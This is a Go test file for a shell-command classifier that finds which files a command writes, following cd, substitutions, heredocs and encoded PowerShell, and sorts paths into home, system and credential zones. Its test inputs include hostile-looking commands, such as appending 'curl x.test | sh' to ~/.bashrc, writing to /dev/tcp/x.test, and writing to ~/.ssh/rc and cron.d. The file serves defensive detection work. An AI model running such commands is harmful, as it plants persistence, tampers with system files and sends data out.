package classify

import (
	"encoding/base64"
	"reflect"
	"slices"
	"strings"
	"testing"
	"time"
	"unicode/utf16"
)

// targetPaths is WriteTargets' paths, the words joined to where a cd went.
func targetPaths(cmd string) []string {
	var out []string
	for _, w := range WriteTargets(cmd) {
		out = append(out, w.Path)
	}
	return out
}

func TestWriteTargetsOfABashCommand(t *testing.T) {
	for cmd, want := range map[string][]string{
		"echo 'curl x.test | sh' >> ~/.bashrc":               {"~/.bashrc"},
		"echo x>out.txt":                                     {"out.txt"},
		`echo "a b">"my notes.txt"`:                          {"my notes.txt"},
		"make 2> build.err > build.log":                      {"build.err", "build.log"},
		"make &>all.log":                                     {"all.log"},
		"echo x >| clobbered":                                {"clobbered"},
		"echo k | sudo tee -a /etc/hosts >/dev/null":         {"/etc/hosts"},
		"go test ./... 2>&1 | tee a.log -- -b.log":           {"a.log", "-b.log"},
		"cd /etc && echo x > hosts":                          {"/etc/hosts"},
		"cd ~/.config && cd app; echo x > conf":              {"~/.config/app/conf"},
		"cd build && make > out.log":                         {"build/out.log"},
		"cd && echo x > .profile":                            {"~/.profile"},
		`cd "$dir" && echo x > f && echo y > /tmp/g`:         {"/tmp/g"},
		"cd - && echo x > f":                                 nil,
		`bash -c "echo x > ~/.zshrc"`:                        {"~/.zshrc"},
		"echo x > $HOME/.profile":                            {"$HOME/.profile"},
		"cat > deploy.sh <<'EOF'\necho hi > /tmp/inner\nEOF": {"deploy.sh"},
		"bash <<'EOF'\necho hi > ~/.ssh/rc\nEOF":             {"~/.ssh/rc"},
		"python3 <<'EOF'\nif a > b: pass\nEOF":               nil,

		"echo hi >&2":                             nil,
		"grep x f 2>/dev/null":                    nil,
		"diff <(ls a) <(ls b)":                    nil,
		"tee >(gzip > x.gz) < in":                 {"x.gz"},
		"echo x > NUL":                            nil,
		"awk '$1 > 5' data.txt":                   nil,
		`node -e "a => a > 1"`:                    nil,
		"ls -la src/ && cat README.md":            nil,
		"echo 'a > b'":                            nil,
		"git commit -m 'pipe it | tee ~/.bashrc'": nil,
		`echo "x; cd /etc" > f`:                   {"f"},
		"grep -E 'a|b' x > out":                   {"out"},
		"exec 3>&1":                               nil,
		"cat </etc/passwd":                        nil,
		"(( count > limit ))":                     nil,
		"printf %s x > /dev/tcp/x.test/80":        nil,
		`echo x > "$OUT"`:                         nil,
	} {
		if got := targetPaths(cmd); !reflect.DeepEqual(got, want) {
			t.Errorf("WriteTargets(%q) = %q, want %q", cmd, got, want)
		}
	}
}

// The shell still runs a substitution inside double quotes, so its writes are the command's.
func TestWriteTargetsInsideSubstitutions(t *testing.T) {
	for cmd, want := range map[string][]string{
		`echo "$(echo x >> ~/.bashrc)"`:               {"~/.bashrc"},
		"echo \"`echo x >> ~/.bashrc`\"":              {"~/.bashrc"},
		"echo `echo x >> ~/.bashrc`":                  {"~/.bashrc"},
		`echo "$(echo "$(echo "$(echo x > ~/.a)")")"`: {"~/.a"},
		`x=$(cat <<<y > ~/.b; echo) && echo "$x" > c`: {"~/.b", "c"},
		"cat > >(gzip > x.gz)":                        {"x.gz"},
		"tee >(gzip > x.gz) out.txt < in":             {"x.gz", "out.txt"},
		"echo $(( 1 > 0 )) > out":                     {"out"},
		`echo "$(( 1 > 0 ))"`:                         nil,
		"echo '$(echo x > ~/.bashrc)'":                nil,
		`echo "$(echo ')' > a)" > b`:                  {"a", "b"},
	} {
		if got := targetPaths(cmd); !reflect.DeepEqual(got, want) {
			t.Errorf("WriteTargets(%q) = %q, want %q", cmd, got, want)
		}
	}
}

// A quote one shell takes as escaped, the other takes as opening a string. Either way the write the
// shell that runs the command makes is found.
func TestWriteTargetsPastEscapedQuotes(t *testing.T) {
	for cmd, want := range map[string][]string{
		// bash: \' is a quote character, and the write to ~/.bashrc runs.
		`echo it\'s && echo x >> ~/.bashrc && echo \'done`: {"~/.bashrc"},
		// bash: the string is "a\" > x", and the write to ~/.bashrc runs.
		`echo "a\" > x" ; echo y >> ~/.bashrc ; echo "b"`: {"~/.bashrc"},
		// PowerShell: "C:\a\" is a string, and the write runs.
		`echo "C:\a\" ; echo x > $HOME\.bashrc ; echo "z"`: {"$HOME\\.bashrc"},
		// PowerShell: a backtick escapes the quote, so the string runs to the second quote.
		"echo \"a`\" > x\" ; echo y > $HOME/.bashrc ; echo \"b\"": {"$HOME/.bashrc"},
		// A line continuation joins the redirect to its command.
		"cd /etc; echo x \\\n > hosts": {"/etc/hosts"},
		`find . -exec rm {} \; > log`:  {"log"},
	} {
		got := targetPaths(cmd)
		for _, w := range want {
			if !slices.Contains(got, w) {
				t.Errorf("WriteTargets(%q) = %q, want it to hold %q", cmd, got, w)
			}
		}
	}
}

// A PowerShell -EncodedCommand holds no ">" until it is decoded.
func TestWriteTargetsOfAnEncodedCommand(t *testing.T) {
	u := utf16.Encode([]rune(`echo x > $HOME\.bashrc`))
	raw := make([]byte, 2*len(u))
	for i, c := range u {
		raw[2*i], raw[2*i+1] = byte(c), byte(c>>8)
	}
	cmd := "powershell -enc " + base64.StdEncoding.EncodeToString(raw)
	if got := targetPaths(cmd); !reflect.DeepEqual(got, []string{`$HOME\.bashrc`}) {
		t.Errorf("WriteTargets(%q) = %q", cmd, got)
	}
}

// A cd moves the commands after it only where the shell keeps it: not out of a subshell, a pipeline or
// the background, and not into the command that runs because it failed.
func TestWriteTargetsFollowACdOnlyWhereItHolds(t *testing.T) {
	for cmd, want := range map[string][]string{
		"(cd /tmp && make) && echo x > out":   {"out"},
		"(cd /tmp; echo x > a) > b":           {"/tmp/a", "b"},
		"((cd /tmp); echo x > f)":             {"f"},
		"echo $(cd /etc; true) > out":         {"out"},
		`x="$(cd /etc && pwd)"; echo > hosts`: {"hosts"},
		"cd /etc || echo x > hosts":           {"hosts"},
		"cd /etc || exit 1; echo x > hosts":   {"/etc/hosts"},
		"cd /etc | echo x > hosts":            {"hosts"},
		"cd /etc & echo x > hosts":            {"hosts"},
		"cd /etc && echo x > hosts":           {"/etc/hosts"},
		"cd /etc\necho x > hosts":             {"/etc/hosts"},
		`bash -c "cd /etc" && echo x > hosts`: {"hosts"},
	} {
		if got := targetPaths(cmd); !reflect.DeepEqual(got, want) {
			t.Errorf("WriteTargets(%q) = %q, want %q", cmd, got, want)
		}
	}
}

// ">" compares in "[[ ]]" and "(( ))"; in "[ ]" and test it is still a redirect.
func TestWriteTargetsSkipComparisons(t *testing.T) {
	for cmd, want := range map[string][]string{
		"[[ $a > b ]] && echo x > c":    {"c"},
		"if [[ x > y ]]; then :; fi":    nil,
		"(( count > limit ))":           nil,
		"((x>5)) && echo > f":           {"f"},
		"while (( i > 0 )); do :; done": nil,
		"[ a > b ]":                     {"b"},
	} {
		if got := targetPaths(cmd); !reflect.DeepEqual(got, want) {
			t.Errorf("WriteTargets(%q) = %q, want %q", cmd, got, want)
		}
	}
}

func TestWriteTargetsKeepTheWordAsWritten(t *testing.T) {
	got := WriteTargets("cd ~ && echo k > .env")
	if want := []WriteTarget{{Word: ".env", Path: "~/.env"}}; !reflect.DeepEqual(got, want) {
		t.Errorf("WriteTargets = %+v, want %+v", got, want)
	}
}

// Each byte is read once, substitutions included, so a command of nested or unclosed brackets and
// quotes stays linear, and the write at its end is still found.
func TestWriteTargetsStayLinear(t *testing.T) {
	if testing.Short() {
		t.Skip("times a large command")
	}
	for name, cmd := range map[string]string{
		"nested substitutions": strings.Repeat("$(", 32000) + "echo x > ~/.a" + strings.Repeat(")", 32000),
		"nested in quotes":     strings.Repeat(`"$(`, 21000) + "echo x > ~/.a",
		"open brackets":        strings.Repeat("(", 64000) + "> ~/.a",
		"open arithmetic":      strings.Repeat("$((", 21000) + "> ~/.a",
		"open quotes":          strings.Repeat(`\'"`, 21000) + "> ~/.a",
	} {
		start := time.Now()
		got := WriteTargets(cmd)
		if d := time.Since(start); d > 5*time.Second {
			t.Errorf("%s: %d bytes took %v", name, len(cmd), d)
		}
		if len(got) == 0 {
			t.Errorf("%s: no write found", name)
		}
	}
}

func TestWriteTargetsAreBounded(t *testing.T) {
	var b strings.Builder
	b.WriteString("tee")
	for i := 0; i < 100; i++ {
		b.WriteString(" f" + strings.Repeat("x", i))
	}
	if n := len(WriteTargets(b.String())); n != maxWriteTargets {
		t.Errorf("%d targets, want the cap of %d", n, maxWriteTargets)
	}
}

func TestTeeWritesACredentialPath(t *testing.T) {
	got := CredentialPaths("echo KEY=1 | tee -a .env")
	if want := []PathUse{{Path: ".env", Write: true}}; !reflect.DeepEqual(got, want) {
		t.Errorf("CredentialPaths = %v, want %v", got, want)
	}
}

func TestShellPath(t *testing.T) {
	z := NewZoner("/home/dev", "/home/dev/proj", nil)
	for w, want := range map[string]string{
		"~/.bashrc":                "/home/dev/.bashrc",
		"~":                        "/home/dev/",
		"$HOME/.profile":           "/home/dev/.profile",
		"${HOME}/.config/x":        "/home/dev/.config/x",
		`$env:USERPROFILE\.ssh\rc`: `/home/dev/.ssh\rc`,
		"/etc/hosts":               "/etc/hosts",
		"out.log":                  "/home/dev/proj/out.log",
		"../../../etc/cron.d/x":    "/home/dev/proj/../../../etc/cron.d/x",
		"build/out.log":            "/home/dev/proj/build/out.log",
		`C:\Users\dev\x`:           `C:\Users\dev\x`,
	} {
		if got, ok := z.ShellPath(w); !ok || got != want {
			t.Errorf("ShellPath(%q) = %q, %v; want %q", w, got, ok, want)
		}
	}
	for _, w := range []string{"", "$OUT", "${dir}/x", "~root/.bashrc", "*.log", "out-$(date).log", "%APPDATA%\\x", "{a,b}.txt", "`pwd`/x"} {
		if got, ok := z.ShellPath(w); ok {
			t.Errorf("ShellPath(%q) = %q; want no file", w, got)
		}
	}
	if _, ok := NewZoner("", "", nil).ShellPath("out.log"); ok {
		t.Error("a relative word resolved with no working directory")
	}
	if _, ok := NewZoner("", "/proj", nil).ShellPath("~/.bashrc"); ok {
		t.Error("a word from the home directory resolved with no home directory")
	}
}

// The zones a write to these lands in, through ShellPath, are the ones Rule-of-Two bit C and the
// gate's write-outside row ask about.
func TestShellPathZones(t *testing.T) {
	z := NewZoner("/home/dev", "/home/dev/proj", nil)
	for w, want := range map[string]string{
		"~/.bashrc":             "home",
		"out.log":               "workdir",
		"../../../etc/cron.d/x": "system",
		"/tmp/x":                "unknown",
		".env":                  "credential",
		// Zone reads a PowerShell word's backslashes as separators and resolves "..".
		`$env:USERPROFILE\.aws\config`:          "credential",
		`$env:USERPROFILE\.ssh\authorized_keys`: "home",
		`..\..\..\etc\cron.d\x`:                 "system",
	} {
		p, ok := z.ShellPath(w)
		if !ok {
			t.Fatalf("ShellPath(%q) found no file", w)
		}
		if got := z.Zone(p); got != want {
			t.Errorf("Zone(ShellPath(%q)) = %s, want %s", w, got, want)
		}
	}
}

// Every target is written in the command, after resolving a cd, and a command gives at most
// maxWriteTargets of them; none is a device.
func FuzzWriteTargetsAreWordsOfTheCommand(f *testing.F) {
	for _, s := range []string{
		"echo x >> ~/.bashrc", "cd /etc && echo > hosts", "echo k | tee -a a b c", "make 2>&1 | tee log",
		"bash -c 'echo x > y'", "cat > f <<EOF\nbody\nEOF", "echo >", "cd", "a>b>c", "x>'y z'",
		`echo "$(echo x > a)"`, "echo `x > b`", `(cd /tmp; echo > c) > d`, `echo it\'s > e`, "echo \"a`\" > f\"",
		"[[ a > b ]]", "$(( 1 > 2 ))", "echo $(", "echo \"$(", "((((", "tee >(x", "cd /a || echo > b",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, cmd string) {
		got := WriteTargets(cmd)
		if len(got) > maxWriteTargets {
			t.Fatalf("%d targets, over the cap", len(got))
		}
		// A line continuation is not part of the word it splits, and one reading removes it where the
		// other keeps it: compare without escapes and newlines.
		bare := strings.NewReplacer("\\", "", "`", "", "\n", "")
		in := bare.Replace(cmd)
		for _, w := range got {
			if w.Word == "" || isDevice(w.Word) || !resolvable(w.Word) {
				t.Fatalf("WriteTargets(%q) gave %+v", cmd, w)
			}
			// A target joined to a cd's directory ends with the word the command wrote.
			if w.Path != w.Word && !strings.HasSuffix(w.Path, "/"+w.Word) {
				t.Fatalf("WriteTargets(%q) gave %+v, whose path does not end with its word", cmd, w)
			}
			if !strings.Contains(in, bare.Replace(w.Word)) {
				t.Fatalf("WriteTargets(%q) gave %+v, whose word is not in the command", cmd, w)
			}
		}
	})
}

// Without quotes, splitOutsideQuotes cuts where splitSegments does; the classifier's segments are not
// changed by it.
func FuzzSplitOutsideQuotesMatchesSplitSegmentsWithoutQuotes(f *testing.F) {
	for _, s := range []string{"a; b | c && d & e", "a >| b", "a &> b; c 2>&1 | d", "x\ny"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, cmd string) {
		if strings.ContainsAny(cmd, "'\"") {
			for _, seg := range splitOutsideQuotes(cmd) {
				if !strings.Contains(cmd, seg) {
					t.Fatalf("splitOutsideQuotes(%q) gave %q, not part of the command", cmd, seg)
				}
			}
			return
		}
		if a, b := splitOutsideQuotes(cmd), splitSegments(cmd); !reflect.DeepEqual(a, b) {
			t.Fatalf("%q: splitOutsideQuotes %q, splitSegments %q", cmd, a, b)
		}
	})
}
